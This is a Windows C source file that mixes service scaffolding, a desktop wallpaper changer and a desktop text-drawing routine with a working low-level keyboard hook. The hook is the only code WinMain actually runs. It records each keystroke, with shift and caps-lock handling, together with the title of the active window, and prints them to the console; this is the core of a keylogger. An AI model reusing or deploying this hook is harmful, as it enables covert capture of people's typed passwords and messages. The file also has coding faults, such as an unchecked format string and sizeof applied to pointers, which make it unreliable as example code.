#include <windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <signal.h>
#include <dbt.h>
#include <tchar.h>
#include <time.h>


#ifndef MAX_PATH
#define MAX_PATH 128
#endif

#ifndef SERVICE_NAME
#define SERVICE_NAME "KeyWave"
#endif


typedef struct _ThisService {
    SERVICE_STATUS status;
    SERVICE_STATUS_HANDLE status_handle;
    HDEVNOTIFY device_notification_handle;
} ThisService;

typedef struct _ServiceState {
    ThisService service;
    HANDLE wakeup_event;
    bool force_exit;
} ServiceState;


static ServiceState g_service_state;
static const GUID GUID_VIOSERIAL_PORT = { 0x6fde7521, 0x1b65, 0x48ae,
    { 0xb6, 0x28, 0x80, 0xbe, 0x62, 0x1, 0x60, 0x26 } };
static const char *g_picture_dir = "C:\\Users\\z\\Desktop\\picture";

HHOOK KeyboardHook = NULL;
// Is shift key down ?
bool shift = false;
// Store window
HWND oldWindow = NULL;
// Window text
char cWindow[MAX_PATH];

void logging(const char* msg)
{
    char log_file[MAX_PATH] = {0};
    FILE *fp = NULL;
    time_t t;
    struct tm* lt;

    GetModuleFileName(NULL, log_file, MAX_PATH);

    *strrchr(log_file, '\\') = 0;
    strcat(log_file, "\\log.txt");
    fp = fopen(log_file, "a+");

    time (&t);
    lt = localtime (&t);
    fprintf(fp, "[%d/%d/%d %d:%d:%d] ", lt->tm_year+1900, lt->tm_mon,
            lt->tm_mday, lt->tm_hour, lt->tm_min, lt->tm_sec);

    fprintf(fp, msg);
    fflush(fp);
    fclose(fp);
}


LPCWSTR str2lpcwstr(const char* str, WCHAR* wsz)
{
    memset(wsz, 0, sizeof(wsz));
    MultiByteToWideChar(CP_ACP, 0, str, strlen(str)+1, wsz,
            sizeof(wsz)/sizeof(wsz[0]));
    return (LPCWSTR)wsz;
}


char* lpcwstr2str(WCHAR* lpcwszStr, char* str)
{
    memset(str, 0, sizeof(str));
    DWORD dwMinSize = 0;

    dwMinSize = WideCharToMultiByte(CP_OEMCP, 0, lpcwszStr, -1, NULL, 0, NULL, false);
    if (0 == dwMinSize) {
        return str;
    }
    WideCharToMultiByte(CP_OEMCP, 0, lpcwszStr, -1, str, dwMinSize, NULL, false);
    return str;
}


bool is_image_file(LPCTSTR in_file)
{
    HANDLE hFile = CreateFile(in_file, FILE_GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hFile)
        return false;
    BYTE data[4] = { 0 };
    DWORD readSize;
    bool ok=false;
    if(ReadFile(hFile, data, 4, &readSize, NULL))
    {
        if (readSize == 4)
        {
            if (data[0] == 0xFF && data[1]==0xD8 && data[2]==0xFF)
            {
                ok = true;
            }
            else if (data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47)
            {
                ok = true;
            }
            else if (data[0] == 0x47 && data[1] == 0x49 && data[2] == 0x46 && data[3] == 0x38)
            {
                ok = true;
            }
            else if (data[0] == 0x49 && data[1] == 0x49 && data[2] == 0x2A && data[3] == 0x00)
            {
                ok = true;
            }
            else if (data[0] == 0x42 && data[1] == 0x4D)
            {
                ok = true;
            }
        }
    }
    CloseHandle(hFile);
    return ok;
}


// check directory exist
bool is_dir_exist(const char* dir)
{
	WIN32_FIND_DATA find_data;
	bool val= false;
	HANDLE h_find = FindFirstFile(dir, &find_data);
    if ((h_find != INVALID_HANDLE_VALUE) &&
            (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        val= true;
    }
	FindClose(h_find);
	return val;
}


void for_each_files(const char* dir, void (*pf)(void *))
{
    HANDLE f_find;
    WIN32_FIND_DATA find_data;
    char buf[MAX_PATH] = {0};

    if (!is_dir_exist(dir)) {
        return;
    }

    strcpy(buf, dir);
    strcat(buf, "\\*.*");

	f_find = FindFirstFile(buf, &find_data);
    if (f_find == INVALID_HANDLE_VALUE) {
        printf("Find first file error\n");
        return;
    }
	do {
		// ignore "." and ".."
        if (strcmp(find_data.cFileName, ".") == 0 ||
                strcmp(find_data.cFileName, "..") == 0)
            continue;

        // not directory
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("file name: %s\n", find_data.cFileName);
            if (pf)
                (*pf)((void *)&find_data);
		}
	} while (FindNextFile(f_find, &find_data));
	FindClose(f_find);
}


static int run_agent_once(ServiceState *s)
{
    logging("Hello world \n");
    Sleep(1000);
    return EXIT_SUCCESS;
}


static void stop_agent(ServiceState *s, bool requested)
{
    if (!s->force_exit) {
        s->force_exit = requested;
    }
}


static int run_agent(ServiceState *s)
{
    int ret = EXIT_SUCCESS;

    s->force_exit = false;

    do {
        ret = run_agent_once(s);
        Sleep(5000);
    } while (!s->force_exit);

    return ret;
}


static void quit_handler(int sig)
{
    int i = 0;
    HANDLE hEventTimeout;

    logging("Thawing filesystems before exiting!\n");

    hEventTimeout = OpenEvent(EVENT_ALL_ACCESS, FALSE, "EVENT_NAME_TIMEOUT");
    if (hEventTimeout) {
        WaitForSingleObject(hEventTimeout, 0);
        CloseHandle(hEventTimeout);
    }
    stop_agent(&g_service_state, true);
}


DWORD WINAPI service_ctrl_handler(DWORD ctrl, DWORD type, LPVOID data,
        LPVOID ctx)
{
    DWORD ret = NO_ERROR;
    ThisService *service = &g_service_state.service;

    switch (ctrl)
    {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            quit_handler(SIGTERM);
            SetEvent(g_service_state.wakeup_event);
            service->status.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(service->status_handle, &service->status);
            break;
        case SERVICE_CONTROL_DEVICEEVENT:
            // handle_serial_device_events(type, data);
            break;

        default:
            ret = ERROR_CALL_NOT_IMPLEMENTED;
    }
    return ret;
}


VOID WINAPI service_main(DWORD argc, TCHAR *argv[])
{
    ThisService *service = &g_service_state.service;

    service->status_handle = RegisterServiceCtrlHandlerEx(SERVICE_NAME,
        service_ctrl_handler, NULL);

    if (service->status_handle == 0) {
        logging("Failed to register extended requests function!\n");
        return;
    }

    service->status.dwServiceType = SERVICE_WIN32;
    service->status.dwCurrentState = SERVICE_RUNNING;
    service->status.dwControlsAccepted =
        SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    service->status.dwWin32ExitCode = NO_ERROR;
    service->status.dwServiceSpecificExitCode = NO_ERROR;
    service->status.dwCheckPoint = 0;
    service->status.dwWaitHint = 0;
    DEV_BROADCAST_DEVICEINTERFACE notification_filter;
    ZeroMemory(&notification_filter, sizeof(notification_filter));
    notification_filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
    notification_filter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
    notification_filter.dbcc_classguid = GUID_VIOSERIAL_PORT;

    service->device_notification_handle =
        RegisterDeviceNotification(service->status_handle,
                &notification_filter, DEVICE_NOTIFY_SERVICE_HANDLE);
    if (!service->device_notification_handle) {
        logging("Failed to register device notification handle!\n");
        return;
    }
    SetServiceStatus(service->status_handle, &service->status);

    run_agent(&g_service_state);

    UnregisterDeviceNotification(service->device_notification_handle);
    service->status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(service->status_handle, &service->status);
}

HFONT CreateFormatFont(LPCTSTR face, int width, int height, int angle)
{
	HFONT hFont;
	hFont = CreateFont(
			height,      //字体的逻辑高度
			width,       //逻辑平均字符宽度
			angle,       //与水平线的角度
			0,           //基线方位角度
			FW_REGULAR,  //字形：常规
			FALSE,       //字形：斜体
			FALSE,       //字形：下划线
			FALSE,       //字形：粗体
			GB2312_CHARSET,          //字符集
			OUT_DEFAULT_PRECIS,      //输出精度
			CLIP_DEFAULT_PRECIS,     //剪截精度
			PROOF_QUALITY,           //输出品质
			FIXED_PITCH | FF_MODERN, //倾斜度
			face                     //字体
			);
	return hFont;
}

void draw_text_from_file(char *file)
{
	wchar_t text1[] = L"你好";

	// 获取一个可供画图的DC
	HDC hdc = GetWindowDC(GetDesktopWindow());

	// 创建红色1像素宽度的实线画笔
	HPEN hpen1 = CreatePen(PS_SOLID, 8, RGB(255, 0, 0));
	// 创建一个实体蓝色画刷
	HBRUSH hbrush1 = CreateSolidBrush(RGB(0, 0, 255));
	// 创建字体
	HFONT hfont1 = CreateFormatFont((LPCTSTR)"黑体", 0, 20, 0);

	// 将hpen1和hbrush1选进HDC，并保存HDC原来的画笔和画刷
	HPEN hpen_old = (HPEN)SelectObject(hdc, hpen1);
	HBRUSH hbrush_old = (HBRUSH)SelectObject(hdc, hbrush1);
	HFONT hfont_old = (HFONT)SelectObject(hdc, hfont1);

	TextOutW(hdc, 800, 500, text1, wcslen(text1));

	// 恢复原来的画笔和画刷
	SelectObject(hdc, hpen_old);
	SelectObject(hdc, hbrush_old);
	SelectObject(hdc, hfont_old);
}

void do_wall_paper(void *args)
{
    WIN32_FIND_DATA *p_find_data = (WIN32_FIND_DATA *)args;
    char full_file_path[MAX_PATH];
    if (p_find_data && p_find_data->cFileName) {
        memset(full_file_path, 0, sizeof(full_file_path));

        strcpy(full_file_path, g_picture_dir);
        strcat(full_file_path, "//");
        strcat(full_file_path, p_find_data->cFileName);

        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, full_file_path,
                SPIF_SENDCHANGE);
        Sleep(5000);
    } else {
        Sleep(1);
    }
}

void do_wall_text(void *args)
{
	WIN32_FIND_DATA *p_find_data = (WIN32_FIND_DATA *)args;
    char full_file_path[MAX_PATH];
    if (p_find_data && p_find_data->cFileName) {
        memset(full_file_path, 0, sizeof(full_file_path));

        strcpy(full_file_path, g_picture_dir);
        strcat(full_file_path, "//");
        strcat(full_file_path, p_find_data->cFileName);

        draw_text_from_file(full_file_path);
        Sleep(1000);
    } else {
        Sleep(1);
    }
}

LRESULT CALLBACK KeyboardCallback(INT nCode, WPARAM wParam, LPARAM lParam)
{
    printf("press button:%d code:%d...\n", wParam, nCode);

    // Forward the event to other hooks
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void write(char *str)
{
    printf("%s\n", str);
}

// Unhook and exit
void Exit()
{
    UnhookWindowsHookEx(KeyboardHook);
    exit(0);
}

// Callback function to be hooked
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    bool bControlKeyDown=0;
    // Get current state of capsLock
    bool caps = GetKeyState(VK_CAPITAL) < 0;
    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *) lParam;
    DWORD dwMsg;
    if(nCode == HC_ACTION){
        // Determine the current state of shift key
        if(p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT){
            if(wParam == WM_KEYDOWN)
            {
                shift = true;
            }
            else
            {
                shift = false;
            }
        }
        // Check if F12 + CTRL is pressed, if yes -> exit
        bControlKeyDown = GetAsyncKeyState (VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
        if (p->vkCode == VK_F12 && bControlKeyDown) // If F12 and CTRL are pressed
        {
            Exit();
        }
        // Start logging keys
        if(wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) // If key has been pressed
        {
            HWND newWindow = GetForegroundWindow();
            if(oldWindow == NULL || newWindow != oldWindow){
                // Get Active window title and store it
                GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
                write("\nActive Window: ");
                write(cWindow);
                write("\n");
                oldWindow = newWindow;
            }
            // Virtual key codes reference: http://msdn.microsoft.com/en-us/library/dd375731%28v=VS.85%29.aspx
            switch(p->vkCode) // Compare virtual keycode to hex values and log keys accordingly
            {
                //Number keys
                case 0x30: write(shift?")":"0");break;
                case 0x31: write(shift?"!":"1");break;
                case 0x32: write(shift?"@":"2");break;
                case 0x33: write(shift?"#":"3");break;
                case 0x34: write(shift?"$":"4");break;
                case 0x35: write(shift?"%":"5");break;
                case 0x36: write(shift?"^":"6");break;
                case 0x37: write(shift?"&":"7");break;
                case 0x38: write(shift?"*":"8");break;
                case 0x39: write(shift?"(":"9");break;
                           // Numpad keys
                case 0x60: write("0");break;
                case 0x61: write("1");break;
                case 0x62: write("2");break;
                case 0x63: write("3");break;
                case 0x64: write("4");break;
                case 0x65: write("5");break;
                case 0x66: write("6");break;
                case 0x67: write("7");break;
                case 0x68: write("8");break;
                case 0x69: write("9");break;
                           // Character keys
                case 0x41: write(caps?(shift?"a":"A"):(shift?"A":"a"));break;
                case 0x42: write(caps?(shift?"b":"B"):(shift?"B":"b"));break;
                case 0x43: write(caps?(shift?"c":"C"):(shift?"C":"c"));break;
                case 0x44: write(caps?(shift?"d":"D"):(shift?"D":"d"));break;
                case 0x45: write(caps?(shift?"e":"E"):(shift?"E":"e"));break;
                case 0x46: write(caps?(shift?"f":"F"):(shift?"F":"f"));break;
                case 0x47: write(caps?(shift?"g":"G"):(shift?"G":"g"));break;
                case 0x48: write(caps?(shift?"h":"H"):(shift?"H":"h"));break;
                case 0x49: write(caps?(shift?"i":"I"):(shift?"I":"i"));break;
                case 0x4A: write(caps?(shift?"j":"J"):(shift?"J":"j"));break;
                case 0x4B: write(caps?(shift?"k":"K"):(shift?"K":"k"));break;
                case 0x4C: write(caps?(shift?"l":"L"):(shift?"L":"l"));break;
                case 0x4D: write(caps?(shift?"m":"M"):(shift?"M":"m"));break;
                case 0x4E: write(caps?(shift?"n":"N"):(shift?"N":"n"));break;
                case 0x4F: write(caps?(shift?"o":"O"):(shift?"O":"o"));break;
                case 0x50: write(caps?(shift?"p":"P"):(shift?"P":"p"));break;
                case 0x51: write(caps?(shift?"q":"Q"):(shift?"Q":"q"));break;
                case 0x52: write(caps?(shift?"r":"R"):(shift?"R":"r"));break;
                case 0x53: write(caps?(shift?"s":"S"):(shift?"S":"s"));break;
                case 0x54: write(caps?(shift?"t":"T"):(shift?"T":"t"));break;
                case 0x55: write(caps?(shift?"u":"U"):(shift?"U":"u"));break;
                case 0x56: write(caps?(shift?"v":"V"):(shift?"V":"v"));break;
                case 0x57: write(caps?(shift?"w":"W"):(shift?"W":"w"));break;
                case 0x58: write(caps?(shift?"x":"X"):(shift?"X":"x"));break;
                case 0x59: write(caps?(shift?"y":"Y"):(shift?"Y":"y"));break;
                case 0x5A: write(caps?(shift?"z":"Z"):(shift?"Z":"z"));break;
                           // Special keys
                case VK_SPACE: write(" "); break;
                case VK_RETURN: write("\n"); break;
                case VK_TAB: write("\t"); break;
                case VK_ESCAPE: write("[ESC]"); break;
                case VK_LEFT: write("[LEFT]"); break;
                case VK_RIGHT: write("[RIGHT]"); break;
                case VK_UP: write("[UP]"); break;
                case VK_DOWN: write("[DOWN]"); break;
                case VK_END: write("[END]"); break;
                case VK_HOME: write("[HOME]"); break;
                case VK_DELETE: write("[DELETE]"); break;
                case VK_BACK: write("[BACKSPACE]"); break;
                case VK_INSERT: write("[INSERT]"); break;
                case VK_LCONTROL: write("[CTRL]"); break;
                case VK_RCONTROL: write("[CTRL]"); break;
                case VK_LMENU: write("[ALT]"); break;
                case VK_RMENU: write("[ALT]"); break;
                case VK_F1: write("[F1]");break;
                case VK_F2: write("[F2]");break;
                case VK_F3: write("[F3]");break;
                case VK_F4: write("[F4]");break;
                case VK_F5: write("[F5]");break;
                case VK_F6: write("[F6]");break;
                case VK_F7: write("[F7]");break;
                case VK_F8: write("[F8]");break;
                case VK_F9: write("[F9]");break;
                case VK_F10: write("[F10]");break;
                case VK_F11: write("[F11]");break;
                case VK_F12: write("[F12]");break;
                             // Shift keys
                case VK_LSHIFT: break; // Do nothing
                case VK_RSHIFT: break; // Do nothing
                                // Symbol keys
                case VK_OEM_1: write(shift?":":";");break;
                case VK_OEM_2: write(shift?"?":"/");break;
                case VK_OEM_3: write(shift?"~":"`");break;
                case VK_OEM_4: write(shift?"{":"[");break;
                case VK_OEM_5: write(shift?"|":"\\");break;
                case VK_OEM_6: write(shift?"}":"]");break;
                case VK_OEM_7: write(shift?"\"":"'");break;
                case VK_OEM_PLUS: write(shift?"+":"=");break;
                case VK_OEM_COMMA: write(shift?"<":",");break;
                case VK_OEM_MINUS: write(shift?"_":"-");break;
                case VK_OEM_PERIOD: write(shift?">":".");break;
                default:
                    dwMsg = p->scanCode << 16;
                    dwMsg += p->flags << 24;
                    char key[16];
                    GetKeyNameText(dwMsg,key,15);
                    write(key);
                    break;
            }
        }
    }
    // Forward the event to other hooks
    return CallNextHookEx(NULL,nCode,wParam,lParam);
}

void init_hook(HINSTANCE hInstance)
{
    KeyboardHook = SetWindowsHookEx(
            WH_KEYBOARD_LL,  // 设置键盘钩子
			keyboardHookProc,
            hInstance,
            0);
    if (KeyboardHook != NULL) {
        printf("SetWindowsHookEx ok...\n");
    } else {
        printf("SetWindowsHookEx error...\n");
    }
}

// The WIN API Message Loop
void KeepAlive()
{
	MSG message;
	while (GetMessage(&message,NULL,0,0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

/* int main() */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    int i;

    init_hook(hInstance);

    /* MessageBox(NULL, _T("It is keyboard time!"), _T("Let's Go"), MB_OK); */
    /* Sleep(10000); */
	KeepAlive();

    if (KeyboardHook != NULL) {
		UnhookWindowsHookEx(KeyboardHook);
        printf("UnhookWindowsHookEx over...\n");
        KeyboardHook = NULL;
    }

    printf("main exit...\n");
    return 0;

    printf("SPIF_SENDCHANGE is :%d\n", SPIF_SENDCHANGE);

    for (i = 0; i < 1; i++) {
        for_each_files(g_picture_dir, do_wall_text);
        Sleep(5000);
    }

    // for debug
    return 0;

    logging("start main...\n");

    SERVICE_TABLE_ENTRY service_table[] = {
        { (char *)SERVICE_NAME, service_main }, { NULL, NULL } };
    StartServiceCtrlDispatcher(service_table);

    logging("end main...\n");
    return 0;
}
